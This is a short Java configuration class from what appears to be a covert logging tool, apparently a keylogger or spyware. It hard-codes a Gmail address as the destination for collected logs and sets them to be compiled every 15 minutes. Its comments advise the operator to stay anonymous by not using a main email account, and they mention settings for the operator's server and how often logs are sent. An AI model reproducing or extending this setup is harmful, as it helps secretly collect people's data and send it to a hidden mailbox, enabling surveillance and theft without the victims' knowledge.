package config;

public class Configuration {
    //youLogMailBox - keep anonymity, do not use the main mail!

                                        //put email
    private static final String YOU_LONG_MAIL_BOX = "loggerinfo71@gmail.com";
    private static final int COUNTS_MINUTES_TO_BUILD_LOG = 15;
    //There will be settings for raising your server and the frequency of sending logs!


    public static String getYouLogMailBox() {
        return YOU_LONG_MAIL_BOX;
    }

    public static int getCountsMinutesToBuildLog() {
        return COUNTS_MINUTES_TO_BUILD_LOG;
    }
}
